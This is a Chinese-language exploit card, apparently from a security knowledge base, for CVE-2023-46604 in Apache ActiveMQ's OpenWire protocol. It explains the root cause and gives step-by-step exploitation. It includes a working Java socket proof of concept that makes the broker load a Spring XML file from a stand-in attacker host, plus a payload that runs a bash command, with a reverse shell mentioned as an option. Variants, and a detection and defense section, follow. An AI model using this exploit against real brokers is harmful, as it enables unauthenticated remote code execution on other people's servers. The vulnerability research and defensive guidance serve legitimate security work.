---
id: web-java-deserialization-activemq-openwire-throwable-constructor-rce
title: ActiveMQ OpenWire 反序列化任意 String 构造方法致 RCE（CVE-2023-46604）
type: scenario
domain: web
path: web/java/deserialization
technique: activemq-openwire-arbitrary-string-constructor
aliases:
- CVE-2023-46604
- ActiveMQ OpenWire RCE
- ExceptionResponseMarshaller createThrowable
- ActiveMQ 任意构造方法调用
- OpenWire 反序列化
tags:
- java
- activemq
- openwire
- deserialization
- rce
- classpath
- cve-2023-46604
cve:
- CVE-2023-46604
severity: critical
confidence: high
status: verified
affected_versions: Apache ActiveMQ <5.15.16、5.16.x <5.16.7、5.17.x <5.17.6、5.18.x <5.18.3（原文公告：修复版本 5.15.16/5.16.7/5.17.6/5.18.3）
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-42
  verified_at: '2026-11-05T06:31:17+08:00'
  notes: 已对照原文与61张截图核对：OpenWireFormat.unmarshal/doUnmarshal 的 readInt(size) 与 readByte(dataType)（img/29/30）、dataMarshallers[31]=ExceptionResponseMarshaller（img/47）、BaseDataStreamMarshaller.createThrowable 的 Class.forName+getConstructor(String)+newInstance（img/32）、ExceptionResponse/ConnectionError/MessageAck 均调用 looseUnmarshalThrowable（img/34/38/40）、报文布局 writeInt(0)/writeByte(31)/writeInt(0)/writeBoolean(false)/writeInt(0)/throwable 三连字符串（img/42 与正文推导）、修复新增 OpenWireUtil.validateIsThrowable（img/52/54）、方法1 socket PoC 与 /tmp/pwned.txt 回显（img/50/51）均一致。小瑕疵：关联卡片同样写成不存在的 [[web-java-component-activemq-jolokia-addnetworkconnector-vm-xbean-rce]]，应为 [[web-java-component-activemq-jolokia-networkconnector-xbean-rce]]。未在本机复现。
---

## 一句话结论

ActiveMQ Classic 的 OpenWire 反序列化在 `BaseDataStreamMarshaller.createThrowable()` 中直接对报文里指定的类名执行 `Class.forName(...).getConstructor(String.class).newInstance(message)`，只要求构造方法接受一个 String；攻击者向 61616 端口发送一个 `ExceptionResponse`（或 `ConnectionError`/`MessageAck`）报文，把类名设为 `org.springframework.context.support.ClassPathXmlApplicationContext`、参数设为远程 XML URL，即可在构造器返回前完成 Spring XML 加载与 `init-method` 命令执行。

## 原理

- **OpenWire 帧结构**：`OpenWireFormat.unmarshal` 先 `readInt` 取 size（与 `maxFrameSize` 比较，写 0 可跳过限制），再 `doUnmarshal` `readByte` 取 `dataType`。`dataType` 索引 `dataMarshallers[]`，决定使用哪个 `DataStreamMarshaller`；31 对应 `ExceptionResponseMarshaller`，16 对应 `ConnectionErrorMarshaller`。
- **tight/loose 分支**：`doUnmarshal` 根据 `tightEncodingEnabled` 选择 `tightUnmarshal`（先读 `BooleanStream`）或 `looseUnmarshal`。直接建立原始 socket、不进行 OpenWire 握手时，服务端按 loose 路径解析，因此可以手工拼字节流；官方客户端路径则走 tight。
- **危险 sink**：`BaseDataStreamMarshaller.createThrowable(String className, String message)`：
  ```java
  Class clazz = Class.forName(className, false, BaseDataStreamMarshaller.class.getClassLoader());
  Constructor constructor = clazz.getConstructor(new Class[]{String.class});
  return (Throwable) constructor.newInstance(new Object[]{message});
  ```
  它在 `looseUnmarshalThrowable` 中被调用：先 `readBoolean`，为 true 时再读类名和消息字符串。`ExceptionResponseMarshaller`、`ConnectionErrorMarshaller`、`MessageAckMarshaller` 都会在解析异常字段时走到这里。
- **为什么能 RCE**：`ClassPathXmlApplicationContext(String)` 位于 ActiveMQ 自带 Spring 依赖的 classpath 上；它的构造器会 `refresh()` 并加载传入的 XML，Spring 在 refresh 阶段实例化 bean 并执行 `init-method`。虽然 `createThrowable` 最后把对象强转为 `Throwable` 会失败（`ClassPathXmlApplicationContext` 不是 `Throwable`），但构造函数已经执行，命令在强转前完成。
- **报文布局（ExceptionResponse, loose）**：
  - `int size = 0`
  - `byte dataType = 31`
  - `int commandId = 0`
  - `boolean responseRequired = false`
  - `int correlationId = 0`
  - `boolean throwablePresent = true`
  - `boolean classNamePresent = true` + `writeUTF(className)`
  - `boolean messagePresent = true` + `writeUTF(url)`
- **ConnectionError 变体**：`dataType=16`，字段为 `int commandId`、`boolean responseRequired`，随后同样读 `looseUnmarshalThrowable`，最后还会读 `connectionId`；利用时只要保证异常字段先被解析即可。
- **修复**：在 `createThrowable` 调用构造器前增加 `OpenWireUtil.validateIsThrowable(clazz)`，只有 `Throwable` 子类才允许实例化。`ClassPathXmlApplicationContext` 不满足条件，链被阻断。

## 触发条件

- 目标为 Apache ActiveMQ Classic 受影响版本（原文公告：修复版本 5.15.16、5.16.7、5.17.6、5.18.3；对应更早版本受影响）。
- 攻击者能访问 OpenWire 端口（默认 61616）；无需认证即可发送原始字节流。
- 目标 classpath 存在可用的单 String 构造方法类，且该类能产生副作用。ActiveMQ 自带 Spring，`ClassPathXmlApplicationContext` 是最直接的选择；也可使用 `org.springframework.context.support.FileSystemXmlApplicationContext` 等。
- 目标能访问攻击者的 XML（出网利用）；不出网场景见关联卡。
- 目标未启用类白名单/OpenWire 加固，且版本未修复。

## 利用步骤

1. 在攻击者 HTTP 服务放置 `spring-poc.xml`：`ProcessBuilder` bean 配 `init-method="start"`，命令写入标记文件或反弹 shell。
2. 用 socket 连接目标 61616，按上表写入 OpenWire 帧：`size=0`、`dataType=31`、CommandId/CorrelationId、`responseRequired=false`，再写 throwable 的存在位、类名和 URL。
3. 服务端 `doUnmarshal` → `ExceptionResponseMarshaller.looseUnmarshal` → `looseUnmarshalThrowable` → `createThrowable`，实例化 `ClassPathXmlApplicationContext(url)`。
4. Spring `refresh()` 拉取并解析 XML，执行 `ProcessBuilder.start`；攻击者 HTTP 日志出现 `GET /spring-poc.xml`，目标生成标记文件。
5. 验证后清理 marker 与 HTTP 服务。

## PoC

```java
import java.io.DataOutputStream;
import java.io.OutputStream;
import java.net.Socket;

public class SocketExp {
    public static void main(String[] args) throws Exception {
        Socket socket = new Socket("target", 61616);
        DataOutputStream dos = new DataOutputStream(socket.getOutputStream());

        dos.writeInt(0);      // size：0 跳过 maxFrameSize 限制
        dos.writeByte(31);    // dataType：ExceptionResponseMarshaller
        dos.writeInt(0);      // CommandId
        dos.writeBoolean(false); // responseRequired
        dos.writeInt(0);      // CorrelationId

        dos.writeBoolean(true);  // throwable 存在
        dos.writeBoolean(true);  // className 存在
        dos.writeUTF("org.springframework.context.support.ClassPathXmlApplicationContext");
        dos.writeBoolean(true);  // message 存在
        dos.writeUTF("http://attacker:7777/spring-poc.xml");

        dos.flush();
        dos.close();
        socket.close();
    }
}
```

`spring-poc.xml`：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans">
  <bean id="cmd" class="java.lang.ProcessBuilder" init-method="start">
    <constructor-arg>
      <list>
        <value>bash</value>
        <value>-c</value>
        <value><![CDATA[touch /tmp/pwned.txt]]></value>
      </list>
    </constructor-arg>
  </bean>
</beans>
```

## 变体与关联

- **ConnectionError（type 16）**：字段更短，`looseUnmarshalThrowable` 同样可达；当 ExceptionResponse 路径被过滤时可尝试。
- **MessageAck**：`looseUnmarshal` 末尾也调用 `looseUnmarshalThrowable`，但前置字段多，需要构造完整 Ack 数据。
- **官方客户端发送**：重写 `TcpTransport.oneway`，让 `command` 为 `ExceptionResponse`（其 `getDataStructureType()` 固定返回 31），再用官方 `OpenWireFormat.marshal` 发送；适合需要复用客户端连接/代理的场景。也可直接调用 `((ActiveMQConnection) connection).getTransportChannel().oneway(exceptionResponse)`。
- **不出网利用**：不加载远程 XML，改用 ActiveMQ 自带的 `IniEnvironment(String)` 作为构造方法 sink，通过 Shiro INI 触发 getter/setter 链（见关联卡）。
- 关联卡片：[[web-java-deserialization-activemq-46604-intranet-ini-environment-getter-setter]]、[[web-java-component-activemq-jolokia-addnetworkconnector-vm-xbean-rce]]。

## 检测与防御

- **网络侧**：61616 端口出现非 OpenWire 握手的原始 TCP 数据；帧首 `size=0`、`dataType=31/16`，随后出现 `ClassPathXmlApplicationContext`、`FileSystemXmlApplicationContext`、`http://` 等 UTF 字符串，是强特征。IDS 可对 OpenWire 帧做字段级解析并告警任意类名。
- **主机侧**：ActiveMQ 进程向外部拉取 XML、`ResourceXmlApplicationContext`/`ClassPathXmlApplicationContext` 加载远程资源、`ProcessBuilder.start` 由 OpenWire 线程触发；JVM 中出现非业务类加载。
- **防御**：升级到修复版本；限制 61616 仅对可信客户端开放；在 broker 前加协议感知代理/WAF；启用 Java 反序列化过滤器或 OpenWire 类白名单；禁止 broker 出网；监控异常 XML 拉取。
- **排查**：检查 broker 日志中的 `ExceptionResponse`/`createThrowable` 异常、临时目录中的 marker、ActiveMQ 进程的网络连接；对历史流量按上述帧特征回溯。
